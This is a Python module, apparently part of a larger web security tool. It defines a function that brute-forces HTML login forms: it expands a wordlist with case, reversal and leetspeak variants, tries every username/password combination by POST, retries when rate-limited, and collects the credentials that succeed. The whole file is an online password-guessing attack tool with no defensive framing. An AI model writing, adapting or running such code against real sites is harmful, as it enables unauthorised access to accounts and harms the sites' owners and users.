# python imports
import time

# funcs imports
from funcs import transform
from funcs.tokenizer import tokenize_html

# network imports
from network.Socket import Socket
from network.HttpRequest import HttpRequest
from network.HttpResponse import HttpResponse

# utils imports
from utils.constants import HTTP_CONTENTTYPE_FORMENCODED, HTTP_RETRY_TIME, HTTP_TOO_MANY_REQ
from utils.constants import SUCCESS_KEYWORDS
from utils.login_utils import verify_success_resp, detect_login
from utils.namedtuples import Credential

def bruteforce(request, url, host, port, agent, 
                user_key, pass_key, action_val, words):
    """ Bruteforces every combination of username and password for a specific form.

    Parameters
    ----------
    request : HttpRequest (method="POST")
        HttpRequest object through which POST requests can be sent
    url : string
        url to which the HTTP POST request will send
    host : string
        HTTP Host header
    port : int
        port of the connection
    agent : string
        HTTP User-Agent header
    user_key : string
        the "name" attribute of the username input for the login form
    pass_key : string
        the "name" attribute of the password input for the login form
    action_key : string
        the "action" attribute of the login form
    words : set(string)
        set of words from which to use for bruteforcing

    Returns
    -------
    success : list((string,string))
        success will be a list of namedtuples called Credentials whose first element
        is a string denoting the username and the second element is a string denoting
        the password. The Credentials in the list denote successful attempts.
    """
    # successful credentials
    success = []
    success_users = set()

    # Add all transformations for each word
    all_words = set(words)
    transformations = transform.generate_transformations(list(words))
    for word in words:
        transformation = transformations[word]
        all_words.add(transformation.lower)
        all_words.add(transformation.upper)
        all_words.add(transformation.reverse)
        all_words.add(transformation.leet)
    
    # Try all combinations for the form described by url on host
    content_type = HTTP_CONTENTTYPE_FORMENCODED
    sleep_time = HTTP_RETRY_TIME
    for user in all_words:
        for _pass in all_words:
            data = {user_key: user, pass_key: _pass, 'action': action_val}
            body = HttpRequest.generate_post_body(content_type,data)
            content_length = len(body)
            too_many_req = 0
            while too_many_req < HTTP_TOO_MANY_REQ:
                response = request.send_post_request(url, host, 
                                agent, content_type,
                                content_length, body)
                if response is None:
                    too_many_req += 1
                    print(f"    unable to contact {host}{url}. retrying in {HTTP_RETRY_TIME} seconds.")
                    time.sleep(HTTP_RETRY_TIME)
                    continue
                # print(f'User: {user}, Pass: {_pass}')
                
                # See if the response contained any words that indicate a successful login.
                if verify_success_resp(tokenize_html(response.response,True)):
                    # print(f'    SUCCESS.')
                    if user.lower() not in success_users:
                        success.append(Credential(user.lower(),_pass))
                        success_users.add(user.lower())
                    break
                
                # Check the status code.
                status_tuple = response.status_code
                if status_tuple is not None:
                    status_code, __ = status_tuple
                    # print(f'     FAIL. {status_code}')
                    if status_code == "429" or status_code == "503":
                        time.sleep(sleep_time)
                        print(f"    {host}{url} was busy. retrying in {HTTP_RETRY_TIME} seconds.")
                        too_many_req += 1
                    else:
                        break
            if too_many_req >= HTTP_TOO_MANY_REQ:
                return success
    return success